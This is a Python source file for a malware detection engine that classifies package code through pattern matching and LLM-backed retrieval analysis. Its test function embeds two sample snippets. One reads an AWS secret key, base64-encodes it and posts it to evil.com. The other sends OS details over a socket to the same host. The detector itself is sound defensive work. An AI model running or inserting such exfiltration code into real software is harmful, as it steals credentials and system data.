"""Malice Detection Engine

Two Detection Modes:
1. Pure RAG Mode: Always use RAG analysis regardless of pattern matching
2. Pattern + RAG Mode:
   - Deterministic patterns (pure_malware_only/pure_benign_only) -> immediate output
   - Justification patterns (distinction_*) -> Pattern + RAG two-stage detection
"""

import os
import sys
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass
from pathlib import Path
from enum import Enum

PYGUARD_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, PYGUARD_ROOT)

from Core.RAG.rag_knowledge_builder import PatternKnowledge, CaseKnowledge
from Utils.llmquery import LLMAgent


class MatchResult(Enum):
    """Pattern matching result types"""
    NO_MATCH = "no_match"
    DETERMINISTIC_MALWARE = "deterministic_malware"
    DETERMINISTIC_BENIGN = "deterministic_benign"
    DETERMINISTIC_BOTH = "deterministic_both"
    JUSTIFICATION_ONLY = "justification_only"


@dataclass
class DetectionOutput:
    is_malicious: bool
    confidence: float
    matched_patterns: List[str]
    risk_level: str
    detection_method: str  # "pattern_match", "rag_analysis", or "pattern_rag"

    top_similar_patterns: List[Dict[str, Any]]
    top_similar_cases: List[Dict[str, Any]]

    llm_reasoning: str
    explanation: str
    recommendation: str

    action_sequence: List[str]
    code_context: str


class MaliceDetectionEngine:
    """Base detection interface"""

    def detect(
        self,
        code_context: str,
        action_sequence: List[str],
        additional_context: Optional[Dict[str, Any]] = None
    ) -> DetectionOutput:
        raise NotImplementedError("Subclass must implement detect()")


class RAGBasedDetection(MaliceDetectionEngine):
    """
    Pure RAG Mode: Always use RAG analysis regardless of pattern matching
    This is the original detection method.
    """

    DEFAULT_KB_DIR = os.path.join(PYGUARD_ROOT, "Core", "RAG", "rag_knowledge_base")

    def __init__(self, kb_dir: Optional[str] = None):
        self.llm_agent = LLMAgent()
        self.kb_dir = Path(kb_dir) if kb_dir else Path(self.DEFAULT_KB_DIR)
        self._init_rag_engine()

    def _init_rag_engine(self):
        try:
            from Core.RAG.rag_query_engine import RAGQueryEngine
            self.rag_engine = RAGQueryEngine(knowledge_base_dir=str(self.kb_dir))
        except Exception as e:
            raise RuntimeError(f"Failed to initialize RAG query engine: {e}")

    def _parse_rag_result(self, rag_result: Dict[str, Any]) -> DetectionOutput:
        """Parse RAG result into DetectionOutput"""

        is_malicious = rag_result.get("is_malicious", False)
        matched_patterns = rag_result.get("matched_patterns", [])

        top_patterns = rag_result.get("top_patterns", [])[:5]
        top_cases = rag_result.get("top_similar_cases", [])[:5]

        llm_reasoning = rag_result.get("llm_reasoning", "")
        explanation = rag_result.get("explanation", "")
        recommendation = rag_result.get("recommendation", "")

        confidence = self._calculate_confidence(top_patterns, top_cases, is_malicious)
        risk_level = self._determine_risk_level(is_malicious, confidence, matched_patterns)

        return DetectionOutput(
            is_malicious=is_malicious,
            confidence=confidence,
            matched_patterns=[p.get("pattern_sequence", []) for p in matched_patterns],
            risk_level=risk_level,
            detection_method="rag_analysis",
            top_similar_patterns=top_patterns,
            top_similar_cases=top_cases,
            llm_reasoning=llm_reasoning,
            explanation=explanation,
            recommendation=recommendation,
            action_sequence=rag_result.get("api_sequence", []),
            code_context=rag_result.get("code_context", "")
        )

    def _calculate_confidence(
        self,
        top_patterns: List[Dict],
        top_cases: List[Dict],
        is_malicious: bool
    ) -> float:
        if not top_patterns and not top_cases:
            return 0.5

        pattern_scores = [p.get("similarity", 0.0) for p in top_patterns]
        avg_pattern_sim = sum(pattern_scores) / len(pattern_scores) if pattern_scores else 0.0

        case_scores = [c.get("similarity", 0.0) for c in top_cases]
        avg_case_sim = sum(case_scores) / len(case_scores) if case_scores else 0.0

        if top_cases:
            malicious_cases = sum(1 for c in top_cases if c.get("label") == "malicious")
            case_consistency = malicious_cases / len(top_cases) if is_malicious else 1 - (malicious_cases / len(top_cases))
        else:
            case_consistency = 0.5

        confidence = (
            0.3 * avg_pattern_sim +
            0.3 * avg_case_sim +
            0.4 * case_consistency
        )

        return min(max(confidence, 0.0), 1.0)

    def _determine_risk_level(
        self,
        is_malicious: bool,
        confidence: float,
        matched_patterns: List
    ) -> str:
        if not is_malicious:
            return "benign"

        high_risk_patterns = [
            "remote_code_execution",
            "credential_theft",
            "ransomware",
            "backdoor",
            "rootkit"
        ]

        has_high_risk = any(p in str(matched_patterns) for p in high_risk_patterns)

        if has_high_risk or confidence >= 0.8:
            return "high"
        elif confidence >= 0.6:
            return "medium"
        else:
            return "low"

    def detect(
        self,
        code_context: str,
        action_sequence: List[str],
        additional_context: Optional[Dict[str, Any]] = None
    ) -> DetectionOutput:
        """
        Pure RAG Detection: Always use RAG analysis
        """
        try:
            if additional_context is None:
                additional_context = {}

            rag_result = self.rag_engine.query_with_context(
                action_sequence=action_sequence,
                code_context=code_context,
                additional_context=additional_context
            )

            return self._parse_rag_result(rag_result)

        except Exception as e:
            return DetectionOutput(
                is_malicious=False,
                confidence=0.0,
                matched_patterns=[],
                risk_level="unknown",
                detection_method="error",
                top_similar_patterns=[],
                top_similar_cases=[],
                llm_reasoning=f"Detection failed: {str(e)}",
                explanation="Error occurred during detection",
                recommendation="Manual review recommended",
                action_sequence=action_sequence,
                code_context=code_context
            )


class PatternMatchingDetection(MaliceDetectionEngine):
    """
    Pattern + RAG Mode:
    - Deterministic patterns (pure_malware_only/pure_benign_only) -> immediate output
    - Justification patterns (distinction_*) or no match -> Pattern + RAG two-stage detection
    """

    DEFAULT_KB_DIR = os.path.join(PYGUARD_ROOT, "Core", "RAG", "rag_knowledge_base")

    DETERMINISTIC_MALWARE_TYPES = ["pure_malware_only"]
    DETERMINISTIC_BENIGN_TYPES = ["pure_benign_only"]
    JUSTIFICATION_TYPES = ["distinction_benign_biased", "distinction_malware_biased"]

    def __init__(self, kb_dir: Optional[str] = None):
        self.llm_agent = LLMAgent()
        self.kb_dir = Path(kb_dir) if kb_dir else Path(self.DEFAULT_KB_DIR)
        self._init_rag_engine()

    def _init_rag_engine(self):
        try:
            from Core.RAG.rag_query_engine import RAGQueryEngine
            self.rag_engine = RAGQueryEngine(knowledge_base_dir=str(self.kb_dir))
        except Exception as e:
            raise RuntimeError(f"Failed to initialize RAG query engine: {e}")

    def _analyze_pattern_matches(
        self,
        matching_patterns: List[Tuple[int, int, str]]
    ) -> Tuple[MatchResult, List[Dict]]:
        """Analyze pattern matches and determine detection strategy"""

        if not matching_patterns:
            return MatchResult.NO_MATCH, []

        matched_info = []
        has_deterministic_malware = False
        has_deterministic_benign = False
        has_justification = False

        for pattern_id, match_length, match_type in matching_patterns:
            pattern_knowledge = self.rag_engine.pattern_knowledge.get(pattern_id)
            if not pattern_knowledge:
                continue

            pattern_type = pattern_knowledge.pattern_type

            info = {
                "pattern_id": pattern_id,
                "match_length": match_length,
                "match_type": match_type,
                "pattern_type": pattern_type,
                "pattern_sequence": pattern_knowledge.pattern,
                "semantic_summary": pattern_knowledge.semantic_summary,
                "security_assessment": pattern_knowledge.security_assessment
            }
            matched_info.append(info)

            if pattern_type in self.DETERMINISTIC_MALWARE_TYPES:
                has_deterministic_malware = True
            elif pattern_type in self.DETERMINISTIC_BENIGN_TYPES:
                has_deterministic_benign = True
            elif pattern_type in self.JUSTIFICATION_TYPES:
                has_justification = True

        if has_deterministic_malware and has_deterministic_benign:
            return MatchResult.DETERMINISTIC_BOTH, matched_info
        elif has_deterministic_malware:
            return MatchResult.DETERMINISTIC_MALWARE, matched_info
        elif has_deterministic_benign:
            return MatchResult.DETERMINISTIC_BENIGN, matched_info
        elif has_justification:
            return MatchResult.JUSTIFICATION_ONLY, matched_info
        else:
            return MatchResult.NO_MATCH, matched_info

    def _create_deterministic_output(
        self,
        is_malicious: bool,
        matched_info: List[Dict],
        action_sequence: List[str],
        code_context: str,
        match_result: MatchResult
    ) -> DetectionOutput:
        """Create output for deterministic pattern match (no RAG needed)"""

        if match_result == MatchResult.DETERMINISTIC_BOTH:
            explanation = "Matched both malicious and benign deterministic patterns. Classified as malicious since any malicious pattern indicates potential threat."
            confidence = 0.9
        elif is_malicious:
            explanation = "Matched pure malware-only pattern. Immediate classification as malicious."
            confidence = 0.95
        else:
            explanation = "Matched pure benign-only pattern. Immediate classification as benign."
            confidence = 0.95

        risk_level = self._determine_risk_level(is_malicious, confidence, matched_info)

        return DetectionOutput(
            is_malicious=is_malicious,
            confidence=confidence,
            matched_patterns=[p.get("pattern_sequence", []) for p in matched_info],
            risk_level=risk_level,
            detection_method="pattern_match",
            top_similar_patterns=matched_info,
            top_similar_cases=[],
            llm_reasoning="",
            explanation=explanation,
            recommendation="Block package" if is_malicious else "Package appears safe",
            action_sequence=action_sequence,
            code_context=code_context
        )

    def _perform_pattern_rag_detection(
        self,
        code_context: str,
        action_sequence: List[str],
        matched_info: List[Dict],
        additional_context: Optional[Dict[str, Any]] = None
    ) -> DetectionOutput:
        """Perform Pattern + RAG two-stage detection for justification patterns"""

        rag_result = self.rag_engine.query_with_context(
            action_sequence=action_sequence,
            code_context=code_context,
            additional_context=additional_context or {}
        )

        return self._parse_pattern_rag_result(rag_result, matched_info)

    def _parse_pattern_rag_result(
        self,
        rag_result: Dict[str, Any],
        matched_info: List[Dict]
    ) -> DetectionOutput:
        """Parse Pattern + RAG result into DetectionOutput"""

        is_malicious = rag_result.get("is_malicious", False)

        top_patterns = matched_info if matched_info else rag_result.get("top_patterns", [])[:5]
        top_cases = rag_result.get("top_similar_cases", [])[:5]

        llm_reasoning = rag_result.get("llm_reasoning", "")
        explanation = rag_result.get("explanation", "")
        recommendation = rag_result.get("recommendation", "")

        confidence = self._calculate_confidence(top_patterns, top_cases, is_malicious)
        risk_level = self._determine_risk_level(is_malicious, confidence, top_patterns)

        return DetectionOutput(
            is_malicious=is_malicious,
            confidence=confidence,
            matched_patterns=[p.get("pattern_sequence", []) for p in top_patterns if isinstance(p, dict)],
            risk_level=risk_level,
            detection_method="pattern_rag",
            top_similar_patterns=top_patterns,
            top_similar_cases=top_cases,
            llm_reasoning=llm_reasoning,
            explanation=explanation,
            recommendation=recommendation,
            action_sequence=rag_result.get("api_sequence", []),
            code_context=rag_result.get("code_context", "")
        )

    def _calculate_confidence(
        self,
        top_patterns: List[Dict],
        top_cases: List[Dict],
        is_malicious: bool
    ) -> float:
        if not top_patterns and not top_cases:
            return 0.5

        pattern_scores = [p.get("similarity", 0.0) for p in top_patterns if isinstance(p, dict)]
        avg_pattern_sim = sum(pattern_scores) / len(pattern_scores) if pattern_scores else 0.0

        case_scores = [c.get("similarity", 0.0) for c in top_cases if isinstance(c, dict)]
        avg_case_sim = sum(case_scores) / len(case_scores) if case_scores else 0.0

        if top_cases:
            malicious_cases = sum(1 for c in top_cases if isinstance(c, dict) and c.get("label") == "malicious")
            case_consistency = malicious_cases / len(top_cases) if is_malicious else 1 - (malicious_cases / len(top_cases))
        else:
            case_consistency = 0.5

        confidence = (
            0.3 * avg_pattern_sim +
            0.3 * avg_case_sim +
            0.4 * case_consistency
        )

        return min(max(confidence, 0.0), 1.0)

    def _determine_risk_level(
        self,
        is_malicious: bool,
        confidence: float,
        matched_patterns: List
    ) -> str:
        if not is_malicious:
            return "benign"

        high_risk_patterns = [
            "remote_code_execution",
            "credential_theft",
            "ransomware",
            "backdoor",
            "rootkit"
        ]

        has_high_risk = False
        for p in matched_patterns:
            if isinstance(p, dict):
                pattern_seq = p.get("pattern_sequence", [])
                if isinstance(pattern_seq, list):
                    has_high_risk = any(hrp in str(pattern_seq) for hrp in high_risk_patterns)
            elif isinstance(p, list):
                has_high_risk = any(hrp in str(p) for hrp in high_risk_patterns)
            if has_high_risk:
                break

        if has_high_risk or confidence >= 0.8:
            return "high"
        elif confidence >= 0.6:
            return "medium"
        else:
            return "low"

    def detect(
        self,
        code_context: str,
        action_sequence: List[str],
        additional_context: Optional[Dict[str, Any]] = None
    ) -> DetectionOutput:
        """
        Pattern + RAG Detection:
        - Deterministic patterns -> immediate output
        - Justification patterns or no match -> Pattern + RAG two-stage
        """
        try:
            if additional_context is None:
                additional_context = {}

            # Step 1: Pattern Matching
            matching_patterns = self.rag_engine.find_matching_patterns(action_sequence)
            match_result, matched_info = self._analyze_pattern_matches(matching_patterns)

            # Step 2: Determine detection strategy
            if match_result == MatchResult.DETERMINISTIC_MALWARE:
                return self._create_deterministic_output(
                    is_malicious=True,
                    matched_info=matched_info,
                    action_sequence=action_sequence,
                    code_context=code_context,
                    match_result=match_result
                )

            elif match_result == MatchResult.DETERMINISTIC_BENIGN:
                return self._create_deterministic_output(
                    is_malicious=False,
                    matched_info=matched_info,
                    action_sequence=action_sequence,
                    code_context=code_context,
                    match_result=match_result
                )

            elif match_result == MatchResult.DETERMINISTIC_BOTH:
                return self._create_deterministic_output(
                    is_malicious=True,
                    matched_info=matched_info,
                    action_sequence=action_sequence,
                    code_context=code_context,
                    match_result=match_result
                )

            else:
                # JUSTIFICATION_ONLY or NO_MATCH -> Pattern + RAG
                return self._perform_pattern_rag_detection(
                    code_context=code_context,
                    action_sequence=action_sequence,
                    matched_info=matched_info,
                    additional_context=additional_context
                )

        except Exception as e:
            return DetectionOutput(
                is_malicious=False,
                confidence=0.0,
                matched_patterns=[],
                risk_level="unknown",
                detection_method="error",
                top_similar_patterns=[],
                top_similar_cases=[],
                llm_reasoning=f"Detection failed: {str(e)}",
                explanation="Error occurred during detection",
                recommendation="Manual review recommended",
                action_sequence=action_sequence,
                code_context=code_context
            )


class MaliceDetector:
    """
    Simple interface for malice detection

    Usage:
        # Mode 1: Pure RAG (default)
        detector = MaliceDetector(mode="rag")

        # Mode 2: Pattern + RAG
        detector = MaliceDetector(mode="pattern_rag")
    """

    def __init__(
        self,
        detection_engine: Optional[MaliceDetectionEngine] = None,
        kb_dir: Optional[str] = None,
        mode: str = "rag"
    ):
        if detection_engine:
            self.detection_engine = detection_engine
        else:
            if mode == "pattern_rag":
                self.detection_engine = PatternMatchingDetection(kb_dir=kb_dir)
            else:
                self.detection_engine = RAGBasedDetection(kb_dir=kb_dir)

    def detect(
        self,
        code_context: str,
        action_sequence: List[str],
        additional_context: Optional[Dict[str, Any]] = None
    ) -> DetectionOutput:

        return self.detection_engine.detect(
            code_context=code_context,
            action_sequence=action_sequence,
            additional_context=additional_context
        )


def main():
    print("=" * 60)
    print("Test 1: Pure RAG Mode (mode='rag')")
    print("=" * 60)

    detector_rag = MaliceDetector(mode="rag")
    result_rag = detector_rag.detect(
        code_context="""
import os
import requests
import base64

aws_key = os.getenv("AWS_SECRET_KEY")
encoded = base64.b64encode(aws_key.encode())
requests.post("http://evil.com:8080", data=encoded)
        """,
        action_sequence=["READ_ENV_VAR", "ENCODE_BASE64", "HTTP_POST"]
    )

    print(f"Detection Method: {result_rag.detection_method}")
    print(f"  -> 'rag_analysis' means: Always use RAG (original mode)")
    print(f"Is Malicious: {result_rag.is_malicious}")
    print(f"Confidence: {result_rag.confidence}")
    print(f"Risk Level: {result_rag.risk_level}")
    print(f"Explanation: {result_rag.explanation}")
    print()

    print("=" * 60)
    print("Test 2: Pattern + RAG Mode (mode='pattern_rag')")
    print("=" * 60)

    detector_pattern = MaliceDetector(mode="pattern_rag")
    result_pattern = detector_pattern.detect(
        code_context="""
import os
import platform
import socket

os_release = platform.release()
os_version = platform.version()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("evil.com", 8080))
sock.send(f"OS: {os_release} {os_version}".encode())
sock.close()
        """,
        action_sequence=[
            "get_os_release",
            "get_os_version",
            "create_socket",
            "establish_tcp_connection",
            "send_socket_data"
        ]
    )

    print(f"Detection Method: {result_pattern.detection_method}")
    if result_pattern.detection_method == "pattern_match":
        print(f"  -> 'pattern_match' means: Deterministic pattern matched, NO LLM called")
    elif result_pattern.detection_method == "pattern_rag":
        print(f"  -> 'pattern_rag' means: Justification/No match, RAG was used (LLM called)")
    print(f"Is Malicious: {result_pattern.is_malicious}")
    print(f"Confidence: {result_pattern.confidence}")
    print(f"Risk Level: {result_pattern.risk_level}")
    print(f"Explanation: {result_pattern.explanation}")
    print(f"Matched Patterns: {result_pattern.matched_patterns}")


if __name__ == "__main__":
    main()
